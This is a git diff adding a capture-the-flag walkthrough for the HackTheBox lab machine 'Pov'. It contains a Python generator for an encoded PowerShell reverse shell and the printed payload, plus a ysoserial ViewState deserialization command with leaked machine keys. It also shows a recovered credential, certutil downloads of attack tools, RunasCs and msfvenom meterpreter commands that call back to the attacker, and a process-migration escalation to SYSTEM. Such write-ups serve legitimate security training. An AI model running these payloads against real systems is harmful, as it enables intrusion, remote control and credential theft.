@@ -795,3 +795,185 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 `cat root.txt`
 
 <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+## POV
+
+### Reco
+
+**nmap**
+
+`nmap -sVC 10.10.11.251`
+
+<figure><img src=".gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
+
+**/etc/hosts**
+
+* `sudo nano /etc/hosts`
+* 10.10.11.251 pov.htb
+
+**Website**
+
+* FOOTER
+  * dev.pov.htb
+  * user: sfitz
+  *
+
+      <figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+
+**Fuzzing - nothing interesting**
+
+* ffuf -u http://pov.htb/FUZZ -w /home/zihuatanejo/Desktop/Tools/SecLists/Discovery/Web-Content/common.txt
+*
+
+    <figure><img src=".gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
+
+### Weaponisation
+
+**dev subpage**
+
+* dev.pov.htb
+*
+
+    <figure><img src=".gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
+
+
+* there is CV.pdf for download
+*
+
+    <figure><img src=".gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+
+
+* we can try to change the file with reverse shell payload...
+
+### Exploitation
+
+**Burp Download button investigation**
+
+*
+
+    <figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
+
+
+*   Finding the exploit for VIEWSTATE which is response for downloading button...
+
+    * [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------)
+      * **ViewState** is the method that the ASP.NET framework uses by default to p**reserve page and control values between web pages**. When the HTML for the page is rendered, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.
+    * try changing filename from cv.pdf to some sensitive info...
+      * filename -> /web.config
+
+    <figure><img src=".gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
+* we obtained keys below:
+  * decryption="**AES**"
+    * decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"&#x20;
+  * validation="**SHA1**"
+    * validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+* generate reverse shell for powershell
+  * RSforPS.py
+
+```python
+#!/usr/bin/env python3
+#generate reverse powershell cmdline with base64 Encoding
+import sys import base64
+def help(): print("USAGE: %s IP PORT" % sys.argv[0]) print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT") exit()
+try: (ip, port) = (sys.argv[1], int(sys.argv[2])) except: help()
+payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' payload = payload % (ip, port)
+cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmdline)
+```
+
+* python3 RSforPS.py \<ip> \<port>
+
+<figure><img src=".gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+
+```
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+```
+
+### User flag
+
+* Open your Windows virtual machine, download `ysoserial.exe` [here](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov), cd to that folder, paste the payload in the below syntax, and hit enter
+
+```
+ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
+```
+
+* Open a Terminal and start a Listener using:&#x20;
+  * `nc -lvnp 4444`
+* Now click the Download CV in [`http://dev.pov.htb`](http://dev.pov.htb/)`,` capture the request, paste the code that we created in the above step for `__VIEWSTATE` the parameter, and send the request
+  * we received a connection
+* We are in the shell of `sfitz` . I got an interesting file in the Documents Folder of `sfitz` which contains the password of the privileged use `alaading`
+
+```powershell
+PS C:\Users\sfitz\Documents> type connection.xml
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+* Use the below command to fetch that password
+
+```powershell
+echo > pass.txt
+$EncryptedString = Get-Content .\pass.txt
+$SecureString = ConvertTo-SecureString $EncryptedString
+$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
+echo $Credential.GetNetworkCredential().password
+```
+
+* Download RunasCs.exe, psgetsys.ps1 and EnableAllTokenPrivs.ps1 from here
+  * [https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------)
+* Open Terminal in the Downloaded Folder and type the below command to start http server to transfer files from our machine to Windows.
+  * `python3 -m http.server`
+  *
+
+      <figure><img src=".gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
+  * The link of the file will be like [http://YOUR\_IP:8000/filename](http://your\_ip:8000/filename)
+  * use the command below command to download the files in the victim machine
+
+```powershell
+certutil.exe -urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
+certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
+certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
+```
+
+* start a listener in your machine and type the below command in the victim machine to get into Alaading’s account with the credentials
+  * .\RunasCs.exe alaading **f8gQ8fynP44ek1m3** cmd.exe -r YOUR\_IP:4444
+  *
+
+      <figure><img src=".gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
+
+
+  * `type C:\Users\alaading\Desktop\user.txt`
+
+### Root flag
+
+1. If we type `whoami /priv,` we can see that the `sedebugPrivilegePoC` privilege has been disabled.
+2. To Enable the state of this privilege, cd into the directory and execute the script that we downloaded in previous section using the commands\
+   `.\psgetsys.ps1`\
+   `.\EnableAllTokenPrivs.ps1`
+3. In your machine type the below command to create a Windows payload\
+   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe`
+4. Move the `exploit.exe` to the directory that we are hosting the `http.server` and send the file to the victim machine using the above techniques.
+5. Configure the Meterpreter in your machine and run `exploit.exe` in the victim machine.
+6. Type ps and find the PID of `winlogon.exe`
+7. Then type `migrate PID_VALUE` and after that `shell`
+8. Now, you got the access as `nt authority\system`
+9. Use the below command to view the flag or manually cd into Administrator’s directory\
+   `type C:\Users\Administrator\Desktop\root.txt`
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:456/1*RosxpSeskQpRZywj7A9aAw.png" alt="" height="183" width="456"><figcaption></figcaption></figure>
+
+10\. We got the Admin Flag \~
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:381/1*sqJzXkU2WmJy9QfBnj8XXg.png" alt="" height="60" width="381"><figcaption></figcaption></figure>
